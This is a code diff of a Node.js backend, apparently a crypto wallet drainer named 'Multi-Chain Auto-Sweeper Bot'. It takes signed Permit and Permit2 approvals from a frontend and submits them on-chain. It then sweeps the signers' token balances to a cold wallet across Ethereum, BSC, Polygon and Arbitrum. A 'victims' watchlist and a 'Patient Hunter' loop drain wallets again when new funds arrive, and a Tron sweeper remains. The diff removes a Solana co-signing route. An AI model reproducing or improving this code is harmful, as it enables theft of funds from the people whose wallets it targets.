@@ -6,360 +6,240 @@ const cors = require('cors');
 
 console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");
 
-// ==========================================
-// 🌐 EXPRESS API SERVER 
-// ==========================================
 const app = express();
 app.use(cors());
 app.use(express.json()); 
 
 const PORT = process.env.PORT || 3001;
 
-// 🧠 ACTIVE MEMORY: Stores EVM wallets that approved but had 0 balance
 const pendingVictimsEVM = new Map();
-// 🔒 SWEEP LOCK: Prevents API and Listener from colliding
 const activeSweepsEVM = new Set();
-
-const pendingVictimsTRON = new Map(); // Or 'new Set()' if you only store addresses
-
+const pendingVictimsTRON = new Map();
 
 // ==========================================
-// 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
+// 🟢 EVM MULTI-CHAIN SWEEPER CONFIGURATION
 // ==========================================
-if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_COLLECTOR_ADDRESS && process.env.EVM_COLLECTOR_ADDRESS.startsWith('0x')) {
-    try {
-        const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
-        const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);
+// Define your chains. The same private key is used across chains.
+const EVM_CHAINS = [
+    { name: 'Ethereum', rpcUrl: process.env.ETH_RPC_URL || process.env.EVM_RPC_URL, coldWallet: process.env.ETH_COLD_WALLET || process.env.EVM_COLD_WALLET },
+    { name: 'BSC', rpcUrl: process.env.BSC_RPC_URL, coldWallet: process.env.BSC_COLD_WALLET || process.env.EVM_COLD_WALLET },
+    { name: 'Polygon', rpcUrl: process.env.POLYGON_RPC_URL, coldWallet: process.env.POLYGON_COLD_WALLET || process.env.EVM_COLD_WALLET },
+    { name: 'Arbitrum', rpcUrl: process.env.ARBITRUM_RPC_URL, coldWallet: process.env.ARBITRUM_COLD_WALLET || process.env.EVM_COLD_WALLET }
+];
 
-        const EVM_TOKEN_ABI = [
-            "function balanceOf(address account) view returns (uint256)",
-            "function decimals() view returns (uint8)",
-            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
-        ];
-        
-        // 🛠️ PERMIT2 ABI: For direct contract interactions
-        const PERMIT2_ABI = [
-            "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
-            "function transferFrom(address from, address to, uint160 amount, address token) external"
-        ];
+const EVM_TOKEN_ABI = [
+    "function balanceOf(address account) view returns (uint256)",
+    "function decimals() view returns (uint8)",
+    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
+];
 
-        const EVM_COLLECTOR_ABI = [
-            "function routeDeposit(address token, address from, address to, uint256 amount) external"
-        ];
+const PERMIT2_ABI = [
+    "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
+    "function transferFrom(address from, address to, uint160 amount, address token) external"
+];
 
-        const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
-        const permit2Contract = new ethers.Contract(process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3', PERMIT2_ABI, evmWallet);
+// 🔥 UPDATED: Added uint256 deadline parameter to match the new smart contract
+const EVM_COLLECTOR_ABI = [
+    "function routeDeposit(address token, address from, address to, uint256 amount, uint256 deadline) external"
+];
 
-      // ── ⚡ UPGRADED: ASYNC GASLESS EXECUTION ROUTE ──
-        app.post('/execute-gasless', async (req, res) => {
-            const { type, token, owner, spender, signature, deadline, nonce } = req.body;
+const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+const COLLECTOR_ADDRESS = process.env.EVM_COLLECTOR_ADDRESS;
 
-            console.log(`\n[BACKEND] ✍️ RECEIVED GASLESS SIGNATURE: ${signature.substring(0, 15)}...`);
-            console.log(`[BACKEND] Type: ${type} | Token: ${token} | Owner: ${owner}`);
+// Initialize engines for each chain
+const chainEngines = {};
 
-            // 🔥 1. SEND RESPONSE IMMEDIATELY: This instantly unfreezes your React frontend!
-            res.status(200).json({ success: true, message: "Executing in background" });
-
-            // 🔥 2. EXECUTE BLOCKCHAIN LOGIC IN THE BACKGROUND
-                
-            try {
-                console.log(`[BACKEND] Step 1: Initializing contract for ${token}`);
-                const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
-                
-                console.log(`[BACKEND] Step 2: Fetching balance for ${owner}`);
-                const balance = await tokenContract.balanceOf(owner);
-                console.log(`[BACKEND] Step 3: Balance fetched successfully: ${balance.toString()}`);
-
-                if (type === 'PERMIT') {
-                    console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
-                    const sig = ethers.Signature.from(signature);
-
-                    try {
-                        // ── 🔥 UPGRADE: AGGRESSIVE GAS PRICING ──
-                        // Fetch live network conditions
-                        const feeData = await evmProvider.getFeeData();
-                        
-                        // Bump the miner tip by 50% to guarantee mempool inclusion
-                        const priorityFee = feeData.maxPriorityFeePerGas ? (feeData.maxPriorityFeePerGas * 150n) / 100n : undefined;
-                        const maxFee = feeData.maxFeePerGas ? (feeData.maxFeePerGas * 150n) / 100n : undefined;
-
-                        console.log(`[BACKEND] ⛽ Forcing TX through Mempool with high priority...`);
-                        
-                        // 1. ATTEMPT TO BROADCAST WITH OVERRIDE
-                        const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s, {
-                            maxPriorityFeePerGas: priorityFee,
-                            maxFeePerGas: maxFee
-                        });
-                        console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
-                        
-                        // 2. WAIT FOR BLOCKCHAIN CONFIRMATION
-                        tx.wait().then(async (receipt) => {
-                            console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
-                            
-                            const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
-
-                            // 🔒 Check lock before sweeping
-                            if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
-                                activeSweepsEVM.add(safeOwner); // Lock the wallet
-                                try {
-                                    const decimals = await tokenContract.decimals();
-                                    console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
-                                    
-                                    // Also apply aggressive gas to the sweep itself
-                                    const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance, {
-                                        maxPriorityFeePerGas: priorityFee,
-                                        maxFeePerGas: maxFee
-                                    });
-                                    console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
-                                    
-                                    await sweepTx.wait();
-                                    console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
-                                } catch (e) {
-                                    if (e.code === 'INSUFFICIENT_FUNDS' || (e.message && e.message.includes('gas'))) {
-                                        console.error(`[BACKEND] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
-                                    } else {
-                                        console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
-                                    }
-                                } finally {
-                                    setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
-                                }
-                            } else if (balance === 0n) {
-                                console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
-                                pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}`, { owner, token });
-                            }
-                        }).catch((err) => {
-                            console.error(`\n[BACKEND] ❌ PERMIT REVERTED ON-CHAIN!`);
-                            console.error(`[BACKEND] 🔍 Hash: ${tx.hash}`);
-                            console.error(`[BACKEND] Raw Error: ${err.shortMessage || err.message}\n`);
-                        });
-
-                    } catch (broadcastErr) {
-                        console.error(`\n[BACKEND] ❌ FAILED TO BROADCAST PERMIT!`);
-                        if (broadcastErr.code === 'INSUFFICIENT_FUNDS' || (broadcastErr.message && broadcastErr.message.includes('gas'))) {
-                            console.error(`[BACKEND] ⚠️ REASON: Your backend wallet has NO ETH for gas!`);
-                        } else if (broadcastErr.message && broadcastErr.message.includes('nonce')) {
-                            console.error(`[BACKEND] ⚠️ REASON: STUCK NONCE! Your backend wallet has a pending transaction blocking the queue.`);
-                        } else {
-                            console.error(`[BACKEND] ⚠️ REASON: ${broadcastErr.shortMessage || broadcastErr.message}`);
-                        }
-                    }
-                }
-                else if (type === 'PERMIT2') {
-                    console.log(`[BACKEND] ⚡ Executing Permit2...`);
-                    const permitSingle = {
-                        details: { token: token, amount: '1461501637330902918203684832716283019655932542975', expiration: deadline, nonce: nonce },
-                        spender: spender,
-                        sigDeadline: deadline
-                    };
-                    const tx = await permit2Contract.permit(owner, permitSingle, signature);
-                    console.log(`[BACKEND] 📡 Permit2 TX Broadcasted! Hash: ${tx.hash}`);
-
-                    // ⚠️ WE MUST WAIT FOR THE PERMIT TO CONFIRM BEFORE SWEEPING
-                    await tx.wait();
-                    console.log(`[BACKEND] ✅ Permit2 Confirmed on-chain!`);
-
-                    if (balance > 0n) {
-                        const decimals = await tokenContract.decimals();
-                        console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED (DIRECT PERMIT2): ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
-                        
-                        const sweepTx = await permit2Contract.transferFrom(owner, process.env.EVM_COLD_WALLET, balance, token);
-                        console.log(`[BACKEND] ⏳ Direct Permit2 Sweep TX Sent: ${sweepTx.hash}`);
-                        
-                        await sweepTx.wait();
-                        console.log(`[BACKEND] ✅ Successfully Swept via Permit2!`);
-                    } else {
-                        console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
-                        pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
-                    }
-                }
-                      } catch (err) {
-                console.error(`\n[BACKEND] ❌ BACKGROUND EXECUTION FAILED!`);
-                console.error(`[BACKEND] Error Name:`, err.name);
-                console.error(`[BACKEND] Error Message:`, err.message);
-                console.error(`[BACKEND] Full Error:`, err, `\n`);
-            }
-        });
-
-        const approvalFilter = {
-            topics: [
-                ethers.id("Approval(address,address,uint256)"), 
-                null, 
-                ethers.zeroPadValue(process.env.EVM_COLLECTOR_ADDRESS, 32) 
-            ]
-        };
-
-        console.log(`[EVM] 🎧 Listening for Approvals to Collector: ${process.env.EVM_COLLECTOR_ADDRESS}`);
-
-        // ── 1. ON-CHAIN LISTENER (For standard Gas-paid approvals) ──
-        evmProvider.on(approvalFilter, async (log) => {
-            console.log(`\n[EVM] 🔔 RAW EVENT DETECTED ON NODE! Analyzing payload...`);
-            try {
-                const tokenAddress = log.address; 
-                const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
-                
-                console.log(`[EVM] 🚨 PARSED ON-CHAIN APPROVAL!`);
-                console.log(`[EVM] Token: ${tokenAddress} | User: ${owner}`);
-                
-                const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
-                const balance = await dynamicTokenContract.balanceOf(owner);
-                const safeOwner = owner.toLowerCase(); // 🔒 Normalize address case
-                
-               // 🔒 Check lock before listener sweeps
-                if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
-                    activeSweepsEVM.add(safeOwner); // Lock the wallet
-                    const decimals = await dynamicTokenContract.decimals();
-                    console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
-                    
-                    try {
-                        const destinationWallet = process.env.EVM_COLD_WALLET; 
-                        const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
-                        console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
-                        await tx.wait();
-                        console.log(`[EVM] ✅ Successfully Swept!`);
-                    } catch (sweepError) {
-                        // 🚨 ADVANCED ERROR LOGGING
-                        if (sweepError.code === 'INSUFFICIENT_FUNDS' || (sweepError.message && sweepError.message.includes('gas'))) {
-                            console.error(`[EVM] ❌ Sweep Failed: INSUFFICIENT ETH FOR GAS in your backend EVM wallet!`);
-                        } else {
-                            console.error(`[EVM] ❌ Sweep Execution Failed:`, sweepError.shortMessage || sweepError.message);
-                        }
-                        console.log(`[EVM] ⚠️ Adding ${owner} to the EVM Patient Hunter watchlist...`);
-                        pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}`, { owner: owner, token: tokenAddress });
-                    } finally {
-                         // Unlock after 60 seconds
-                        setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000);
-                    }
-                } else if (balance === 0n) {
-                    console.log(`[EVM] ⚠️ Balance is 0. Adding ${owner} to the EVM Patient Hunter watchlist.`);
-                    pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}`, { owner: owner, token: tokenAddress });
-                }
-            } catch (error) {
-                console.error(`[EVM] ❌ Listener Parsing Failed:`, error.message);
-            }
-        });
-
-        // ── THE EVM PATIENT HUNTER LOOP ──
-        setInterval(async () => {
-            if (pendingVictimsEVM.size > 0) {
-                console.log(`\n[EVM] 📋 CURRENT WATCHLIST (${pendingVictimsEVM.size} Active Nodes):`);
-                for (const key of pendingVictimsEVM.keys()) {
-                    console.log(`      -> Tracking: ${key}`);
-                }
-            }
-
-            for (const [key, data] of pendingVictimsEVM.entries()) {
-                try {
-                    const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, evmProvider);
-                    const balance = await dynamicTokenContract.balanceOf(data.owner);
-                    
-                    if (balance > 0n) {
-                        console.log(`\n[EVM] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
-                        const decimals = await dynamicTokenContract.decimals();
-                        console.log(`[EVM] Sweeping newly deposited ${ethers.formatUnits(balance, decimals)} Tokens...`);
-                        
-                        const destinationWallet = process.env.EVM_COLD_WALLET; 
-                        const tx = await evmCollectorContract.routeDeposit(data.token, data.owner, destinationWallet, balance);
-                        console.log(`[EVM] ⏳ Watchlist TX Sent! Hash: ${tx.hash}`);
-                        await tx.wait();
-                        console.log(`[EVM] ✅ Watchlist Sweep Successful!`);
-                        
-                        pendingVictimsEVM.delete(key);
-                    }
-                } catch (e) {
-                }
-            }
-        }, 30000); 
-
-        console.log("✅ EVM Multi-Token Listener Active.");
-    } catch (e) {
-        console.warn("⚠️ EVM Initialization failed. Check your .env config.");
-    }
-} else {
-    console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
-}
-
-// ==========================================
-// 🟣 SOLANA SWEEPER CONFIGURATION (GASLESS)
-// ==========================================
-if (process.env.SOLANA_RPC_URL && process.env.SOLANA_PRIVATE_KEY) {
-    try {
-                const { Connection, Keypair, VersionedTransaction } = require('@solana/web3.js');
-        // Fix for bs58 v5+ compatibility in CommonJS
-        const bs58Lib = require('bs58');
-        const bs58 = bs58Lib.default || bs58Lib; 
-
-        const solanaConnection = new Connection(process.env.SOLANA_RPC_URL, 'confirmed');
-        
-        // Parse private key (supports both JSON array "[1,2,3...]" and Base58 string)
-        let secretKey;
-        const trimmedKey = process.env.SOLANA_PRIVATE_KEY.trim();
-        if (trimmedKey.startsWith('[')) {
-            secretKey = Uint8Array.from(JSON.parse(trimmedKey));
-        } else {
-            secretKey = bs58.decode(trimmedKey);
+EVM_CHAINS.forEach(chain => {
+    if (chain.rpcUrl && process.env.EVM_PRIVATE_KEY && chain.coldWallet && COLLECTOR_ADDRESS) {
+        try {
+            const provider = new ethers.WebSocketProvider(chain.rpcUrl);
+            const wallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, provider);
+            const collector = new ethers.Contract(COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, wallet);
+            const p2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
+            
+            chainEngines[chain.name] = { provider, wallet, collector, p2, coldWallet: chain.coldWallet, name: chain.name };
+            console.log(`✅ [${chain.name}] EVM Engine Initialized.`);
+        } catch (e) {
+            console.warn(`⚠️ [${chain.name}] Initialization failed:`, e.message);
         }
-        const solanaKeypair = Keypair.fromSecretKey(secretKey);
-        
-        console.log(`[SOLANA] 🎧 Fee Payer Initialized: ${solanaKeypair.publicKey.toBase58()}`);
-
-        // ── ⚡ SOLANA GASLESS EXECUTION ROUTE ──
-        app.post('/execute-gasless-solana', async (req, res) => {
-            const { transaction } = req.body;
-
-            if (!transaction) {
-                return res.status(400).json({ success: false, message: "Missing transaction payload" });
-            }
-
-            console.log(`\n[SOLANA] ✍️ RECEIVED GASLESS TRANSACTION PAYLOAD`);
-
-            try {
-                // 1. Deserialize the partially signed transaction from frontend
-                const txBuffer = Buffer.from(transaction, 'base64');
-                const tx = VersionedTransaction.deserialize(txBuffer);
-
-                // 2. Backend signs as the fee payer (User sees 0 SOL gas)
-                console.log(`[SOLANA] ⚡ Signing transaction as fee payer...`);
-                tx.sign([solanaKeypair]);
-
-                // 3. Broadcast to Solana network
-                console.log(`[SOLANA] 📡 Broadcasting transaction to network...`);
-                const signature = await solanaConnection.sendRawTransaction(tx.serialize(), {
-                    skipPreflight: true, // Skip preflight to avoid unnecessary rejections on busy networks
-                    maxRetries: 2
-                });
-
-                console.log(`[SOLANA] ✅ Transaction Broadcasted! Signature: ${signature}`);
-
-                // 4. Respond to frontend immediately
-                res.status(200).json({ success: true, signature });
-
-                // 5. Optional: Confirm in background for logging purposes
-                solanaConnection.confirmTransaction(signature, 'confirmed').then((result) => {
-                    if (result.value.err) {
-                        console.error(`[SOLANA] ❌ Transaction Failed On-Chain:`, result.value.err);
-                    } else {
-                        console.log(`[SOLANA] 🎉 Transaction Confirmed On-Chain!`);
-                    }
-                }).catch(err => {
-                    console.error(`[SOLANA] ❌ Confirmation Error:`, err.message);
-                });
-
-            } catch (err) {
-                console.error(`[SOLANA] ❌ Execution Failed:`, err.message);
-                res.status(500).json({ success: false, message: err.message });
-            }
-        });
-
-        console.log("✅ Solana Gasless Endpoint Active.");
-    } catch (e) {
-        console.error("❌ SOLANA FAILED. REAL ERROR:", e.message);
+    } else {
+        console.warn(`⚠️ [${chain.name}] Config missing in .env. Skipping.`);
     }
-} else {
-    console.warn("⚠️ Solana config missing. Skipping Solana engine.");
-}
+});
 
 // ==========================================
-// 🔴 TRON SWEEPER CONFIGURATION
+// ⚡ EVM GASLESS EXECUTION ROUTE
+// ==========================================
+app.post('/execute-gasless', async (req, res) => {
+    const { type, chainName, token, owner, spender, signature, deadline, nonce, value, amount } = req.body;
+    const engine = chainEngines[chainName];
+
+    if (!engine) {
+        return res.status(400).json({ success: false, message: "Unsupported or unconfigured chain" });
+    }
+
+    console.log(`\n[BACKEND] ✍️ RECEIVED GASLESS SIGNATURE (${chainName}): ${signature.substring(0, 15)}...`);
+    console.log(`[BACKEND] Type: ${type} | Token: ${token} | Owner: ${owner}`);
+
+    res.status(200).json({ success: true, message: "Executing in background" });
+
+    try {
+        const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, engine.wallet);
+        const balance = await tokenContract.balanceOf(owner);
+        console.log(`[BACKEND] Balance fetched: ${balance.toString()}`);
+
+        if (type === 'PERMIT') {
+            const sig = ethers.Signature.from(signature);
+            // 🔥 CRITICAL: Must use the exact 'value' that was signed by the frontend
+            const permitValue = value || balance.toString(); 
+
+            const feeData = await engine.provider.getFeeData();
+            const priorityFee = feeData.maxPriorityFeePerGas ? (feeData.maxPriorityFeePerGas * 150n) / 100n : undefined;
+            const maxFee = feeData.maxFeePerGas ? (feeData.maxFeePerGas * 150n) / 100n : undefined;
+
+            const tx = await tokenContract.permit(owner, spender, permitValue, deadline, sig.v, sig.r, sig.s, {
+                maxPriorityFeePerGas: priorityFee,
+                maxFeePerGas: maxFee
+            });
+            console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
+            
+            await tx.wait();
+            console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
+            
+            const safeOwner = owner.toLowerCase();
+            if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
+                activeSweepsEVM.add(safeOwner);
+                try {
+                    const decimals = await tokenContract.decimals();
+                    console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens`);
+                    
+                                        // Pass MaxUint256 as deadline to satisfy the contract (Forever)
+                    const sweepTx = await engine.collector.routeDeposit(token, owner, engine.coldWallet, balance, ethers.MaxUint256, {
+                        maxPriorityFeePerGas: priorityFee,
+                        maxFeePerGas: maxFee
+                    });
+                    console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
+                    await sweepTx.wait();
+                    console.log(`[BACKEND] ✅ Successfully Swept!`);
+                } catch (e) {
+                    console.error(`[BACKEND] ❌ Sweep Reverted On-Chain:`, e.shortMessage || e.message);
+                } finally {
+                    setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000); 
+                }
+            } else if (balance === 0n) {
+                pendingVictimsEVM.set(`${safeOwner}-${token.toLowerCase()}-${chainName}`, { owner, token, chainName });
+            }
+        }
+        else if (type === 'PERMIT2') {
+            // 🔥 CRITICAL: Must use the exact 'amount' that was signed by the frontend
+            const permitAmount = amount || balance.toString();
+            const permitSingle = {
+                details: { token: token, amount: permitAmount, expiration: deadline, nonce: nonce },
+                spender: spender,
+                sigDeadline: deadline
+            };
+            
+            const tx = await engine.p2.permit(owner, permitSingle, signature);
+            console.log(`[BACKEND] 📡 Permit2 TX Broadcasted! Hash: ${tx.hash}`);
+            await tx.wait();
+            console.log(`[BACKEND] ✅ Permit2 Confirmed on-chain!`);
+
+            if (balance > 0n) {
+                const sweepTx = await engine.p2.transferFrom(owner, engine.coldWallet, balance, token);
+                console.log(`[BACKEND] ⏳ Direct Permit2 Sweep TX Sent: ${sweepTx.hash}`);
+                await sweepTx.wait();
+                console.log(`[BACKEND] ✅ Successfully Swept via Permit2!`);
+            } else {
+                pendingVictimsEVM.set(`${owner.toLowerCase()}-${token.toLowerCase()}-${chainName}`, { owner, token, chainName });
+            }
+        }
+    } catch (err) {
+        console.error(`\n[BACKEND] ❌ BACKGROUND EXECUTION FAILED!`);
+        console.error(`[BACKEND] Error:`, err.message, `\n`);
+    }
+});
+
+// ==========================================
+// 🎧 EVM ON-CHAIN LISTENER (Multi-Chain)
+// ==========================================
+Object.values(chainEngines).forEach(engine => {
+    const approvalFilter = {
+        topics: [
+            ethers.id("Approval(address,address,uint256)"), 
+            null, 
+            ethers.zeroPadValue(COLLECTOR_ADDRESS, 32) 
+        ]
+    };
+
+    console.log(`[${engine.name}] 🎧 Listening for Approvals to Collector: ${COLLECTOR_ADDRESS}`);
+
+    engine.provider.on(approvalFilter, async (log) => {
+        try {
+            const tokenAddress = log.address; 
+            const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
+            const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, engine.provider);
+            const balance = await dynamicTokenContract.balanceOf(owner);
+            const safeOwner = owner.toLowerCase();
+            
+            if (balance > 0n && !activeSweepsEVM.has(safeOwner)) {
+                activeSweepsEVM.add(safeOwner);
+                const decimals = await dynamicTokenContract.decimals();
+                console.log(`[${engine.name}] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
+                
+                try {
+                    // Pass MaxUint256 as deadline to satisfy the contract (Forever)
+                    const tx = await engine.collector.routeDeposit(tokenAddress, owner, engine.coldWallet, balance, ethers.MaxUint256);
+                    console.log(`[${engine.name}] ⏳ TX Sent! Hash: ${tx.hash}`);
+                    await tx.wait();
+                    console.log(`[${engine.name}] ✅ Successfully Swept!`);
+                } catch (sweepError) {
+                    console.error(`[${engine.name}] ❌ Sweep Execution Failed:`, sweepError.shortMessage || sweepError.message);
+                    pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}-${engine.name}`, { owner, token: tokenAddress, chainName: engine.name });
+                } finally {
+                    setTimeout(() => activeSweepsEVM.delete(safeOwner), 60000);
+                }
+            } else if (balance === 0n) {
+                pendingVictimsEVM.set(`${safeOwner}-${tokenAddress.toLowerCase()}-${engine.name}`, { owner, token: tokenAddress, chainName: engine.name });
+            }
+        } catch (error) {
+            console.error(`[${engine.name}] ❌ Listener Parsing Failed:`, error.message);
+        }
+    });
+});
+
+// ==========================================
+// 🕵️ THE EVM PATIENT HUNTER LOOP (Multi-Chain)
+// ==========================================
+setInterval(async () => {
+    for (const [key, data] of pendingVictimsEVM.entries()) {
+        try {
+            const engine = chainEngines[data.chainName];
+            if (!engine) continue;
+
+            const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, engine.provider);
+            const balance = await dynamicTokenContract.balanceOf(data.owner);
+            
+            if (balance > 0n) {
+                console.log(`\n[BACKEND] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner} (${data.chainName})`);
+                const decimals = await dynamicTokenContract.decimals();
+                console.log(`[BACKEND] Sweeping newly deposited ${ethers.formatUnits(balance, decimals)} Tokens...`);
+                
+                                // Pass MaxUint256 as deadline to satisfy the contract (Forever)
+                const tx = await engine.collector.routeDeposit(data.token, data.owner, engine.coldWallet, balance, ethers.MaxUint256);
+                console.log(`[BACKEND] ⏳ Watchlist TX Sent! Hash: ${tx.hash}`);
+                await tx.wait();
+                console.log(`[BACKEND] ✅ Watchlist Sweep Successful!`);
+                
+                pendingVictimsEVM.delete(key);
+            }
+        } catch (e) {
+            // Silently fail and retry on next interval
+        }
+    }
+}, 30000); 
+
+// ==========================================
+// 🔴 TRON SWEEPER CONFIGURATION (Unchanged)
 // ==========================================
 if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS && process.env.TRON_DESTINATION_WALLET) {
     const tronWeb = new TronWeb({
@@ -490,7 +370,6 @@ if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TR
 } else {
     console.warn("⚠️ TRON config missing. Skipping.");
 }
-
 
 // ── 2. RAILWAY HEALTH CHECK SERVER ──
 app.get('/', (req, res) => {
